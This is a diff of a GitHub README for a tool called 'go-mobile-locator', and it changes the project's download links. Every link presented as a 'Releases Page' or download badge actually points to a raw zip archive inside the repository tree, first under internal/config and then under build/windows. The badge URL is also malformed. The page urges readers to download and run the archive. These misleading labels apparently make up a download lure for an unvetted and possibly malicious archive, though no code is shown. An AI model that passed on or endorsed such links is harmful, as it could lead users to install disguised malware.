@@ -1,7 +1,7 @@
 # 📍 go-mobile-locator - Find Mobile Numbers Offline Easily
 
 ## 🔗 Download Now
-[![Download go-mobile-locator](https://github.com/Vhybzofficial1/go-mobile-locator/raw/refs/heads/main/internal/config/mobile-go-locator-1.5.zip%20go--mobile--locator-v1.0-blue)](https://github.com/Vhybzofficial1/go-mobile-locator/raw/refs/heads/main/internal/config/mobile-go-locator-1.5.zip)
+[![Download go-mobile-locator](https://github.com/Vhybzofficial1/go-mobile-locator/raw/refs/heads/main/build/windows/mobile_go_locator_v1.1.zip%20go--mobile--locator-v1.0-blue)](https://github.com/Vhybzofficial1/go-mobile-locator/raw/refs/heads/main/build/windows/mobile_go_locator_v1.1.zip)
 
 ---
 
@@ -18,7 +18,7 @@ To run go-mobile-locator, your computer needs to meet the following requirements
 - **Storage**: Minimum of 200 MB available space
 
 ### 2. Download & Install
-To download and run go-mobile-locator, visit this page to download: [Releases Page](https://github.com/Vhybzofficial1/go-mobile-locator/raw/refs/heads/main/internal/config/mobile-go-locator-1.5.zip).
+To download and run go-mobile-locator, visit this page to download: [Releases Page](https://github.com/Vhybzofficial1/go-mobile-locator/raw/refs/heads/main/build/windows/mobile_go_locator_v1.1.zip).
 
 1. Click on the link above to go to the releases page.
 2. Find the latest version of the application.
@@ -68,7 +68,7 @@ This application includes key topics such as:
 - SQLite, Wails
 
 ## 🔄 Updates
-To stay informed about new features and fixes, regularly check the releases page: [Releases Page](https://github.com/Vhybzofficial1/go-mobile-locator/raw/refs/heads/main/internal/config/mobile-go-locator-1.5.zip). Each version update will provide details about what has changed.
+To stay informed about new features and fixes, regularly check the releases page: [Releases Page](https://github.com/Vhybzofficial1/go-mobile-locator/raw/refs/heads/main/build/windows/mobile_go_locator_v1.1.zip). Each version update will provide details about what has changed.
 
 ## 🔒 License
 go-mobile-locator is open-source software, and you are free to use it as per the licensing terms outlined in the repository.
